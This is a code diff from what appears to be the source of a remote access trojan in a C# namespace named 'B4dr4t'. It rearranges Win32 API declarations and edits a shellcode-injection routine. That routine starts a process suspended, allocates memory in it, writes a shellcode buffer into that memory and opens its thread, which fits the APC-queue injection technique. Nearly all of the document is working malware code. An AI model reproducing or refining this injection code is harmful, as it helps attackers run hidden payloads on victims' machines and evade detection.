@@ -124,13 +124,7 @@ namespace B4dr4t
         public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
           int dwThreadId);
 
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool WriteProcessMemory(
-          IntPtr hProcess,
-          IntPtr lpBaseAddress,
-          byte[] lpBuffer,
-          int nSize,
-          out IntPtr lpNumberOfBytesWritten);
+
 
         [DllImport("kernel32.dll")]
         public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
@@ -138,17 +132,6 @@ namespace B4dr4t
         [DllImport("kernel32")]
         public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
            Int32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
-        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr OpenProcess(
-         ProcessAccessFlags processAccess,
-         bool bInheritHandle,
-         int processId
-        );
 
         [DllImport("kernel32.dll")]
         public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
@@ -349,9 +332,9 @@ namespace B4dr4t
               ProcessCreationFlags.CREATE_SUSPENDED,
               IntPtr.Zero, null, ref si, out pi);
 
-            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shcode.Length, MEM_COMMIT, PAGE_READWRITE);
-            IntPtr bytesWritten = IntPtr.Zero;
-            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, shcode, shcode.Length, out bytesWritten);
+            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shcode.Length, MEM_COMMIT, PAGE_READWRITE);
+            uint bytesWritten = 0;
+            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, shcode, (uint)shcode.Length, ref bytesWritten);
 
             IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
             uint oldProtect = 0;
